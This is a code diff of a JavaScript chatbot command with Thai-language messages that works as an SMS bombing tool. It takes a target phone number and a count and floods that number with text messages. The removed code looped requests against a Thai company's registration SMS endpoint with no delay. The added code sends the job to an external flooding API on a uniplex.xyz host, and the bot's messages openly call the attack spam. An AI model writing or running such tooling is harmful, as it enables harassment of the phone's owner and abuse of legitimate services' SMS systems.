@@ -44,42 +44,37 @@ module.exports = {
       `);
     }
 
-    const apiUrl = `https://www.dataiku-thai.com/api/reg/sms?account=${phone}`;
+    const apiUrl = `http://de01.uniplex.xyz:1636/api/sms?phone=${phone}&count=${count}`;
     const headers = {
-      'Language': 'th-TH',
       'Accept': 'application/json, text/plain, */*',
       'Accept-Encoding': 'gzip, deflate, br',
     };
 
     try {
-      let successCount = 0;
-
       // ส่งข้อความเริ่มต้น
       await api.sendMessage(senderID, `
 🔥 **เริ่มการสแปม SMS สุดเท่** 🔥
 📞 เป้าหมาย: ${phone}
 🎯 จำนวนครั้ง: ${count}
-⚡ ความเร็ว: สูงสุด (ไม่มีดีเลย์)
+⚡ ความเร็ว: สูงสุด (API เดียว)
 👾 **ยิงโดย**: โทมัส
       `);
 
-      // ยิง SMS ตามจำนวนครั้งแบบไม่มีดีเลย์
-      for (let i = 0; i < count; i++) {
-        try {
-          await axios.get(apiUrl, { headers });
-          successCount++;
-        } catch (roundError) {
-          console.error(`❌ ครั้งที่ ${i + 1} ล้มเหลว: ${roundError.message}`);
-        }
+      // เรียก API ครั้งเดียว
+      const response = await axios.get(apiUrl, { headers });
+      const data = response.data;
+
+      if (data.status !== "success") {
+        throw new Error("API รายงานสถานะไม่สำเร็จ");
       }
 
       // ส่งข้อความสรุป
       const totalTime = ((Date.now() - startTime) / 1000).toFixed(2);
       await api.sendMessage(senderID, `
 🎉 **ผลการสแปม SMS สุดเจ๋ง** 🎉
-📞 เบอร์: ${phone}
-✅ ส่งสำเร็จ: ${successCount}/${count} ครั้ง
-⏰ ใช้เวลาทั้งหมด: ${totalTime} วินาที
+📞 เบอร์: ${data.phone}
+✅ ส่งสำเร็จ: ${data.success_count}/${data.total_count} ครั้ง
+⏰ ใช้เวลาทั้งหมด: ${data.time_taken} วินาที (จาก API) | ${totalTime} วินาที (รวม)
 💥 สถานะ: เสร็จสิ้นภารกิจ!
       `);
     } catch (error) {
